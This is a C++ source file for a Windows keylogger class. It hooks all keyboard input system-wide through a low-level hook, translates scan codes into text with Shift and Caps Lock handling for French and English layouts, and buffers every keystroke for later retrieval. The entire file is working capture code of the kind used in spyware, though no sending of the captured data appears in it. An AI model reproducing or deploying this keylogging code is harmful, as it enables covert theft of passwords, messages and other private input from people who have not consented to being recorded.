//
// Created by Etienne Pasteur on 17/10/2017.
//

#include "KeyListener.hpp"

HHOOK hhkLowLevelKybd;
IKeyListener* keyListener;

KeyListener::~KeyListener()
{
	UnhookWindowsHookEx(hhkLowLevelKybd);
}

void KeyListener::Run()
{
	hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(nullptr), 0);
	MSG msg;
	GetMessage(&msg, nullptr, NULL, NULL); // Windows message loop keepalive. This will block the current thread.
}

std::string KeyListener::Flush()
{
	std::string result;
	for (auto const& s : _capturedInputs) { result += s; }
	_capturedInputs.clear();
	return result;
}

void KeyListener::PushKeylog(std::string& keylog)
{
	_capturedInputs.push_back(keylog);
}

KeyListener::KeyListener()
{
	// Set global variable mendatory for hook to access appContext.
	keyListener = this;
}

LRESULT CALLBACK KeyListener::LowLevelKeyboardProc(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION)
	{
		static std::string lastkey("");
		static auto capslock = false;
		static auto shift = false;
		char tmp[0xFF] = {0};
		std::string str;
		DWORD msg = 1;
		auto st_hook = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lp);
		bool printable;

		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);

		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false;
		if (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)
		{
			if (!printable)
			{
				if (str == "VERR.MAJ" || str == "Caps Lock")
					capslock = !capslock;
				else if (str == "MAJ" || str == "Shift")
				{
					if (lastkey != str)
						shift = true;
				}
				else if (str == "ESPACE" || str == "Space")
				{
					str = " ";
					printable = true;
				}
				else
				{
					str = ("[" + str + "]");
					printable = true;
				}
			}

			if (printable)
			{
				if (shift == capslock)
				{
					for (size_t i = 0; i < str.length(); ++i)
						str[i] = tolower(str[i]);
				}
				else
				{
					for (size_t i = 0; i < str.length(); ++i)
					{
						if (str[i] >= 'A' && str[i] <= 'Z')
						{
							str[i] = toupper(str[i]);
						}
					}
				}
				lastkey = str;
				keyListener->PushKeylog(str);
			}
		}
		else if (wp == WM_SYSKEYUP || wp == WM_KEYUP)
		{
			if (str == "MAJ" || str == "Shift")
			{
				shift = false;
			}
		}
	}
	return CallNextHookEx(hhkLowLevelKybd, code, wp, lp);
}
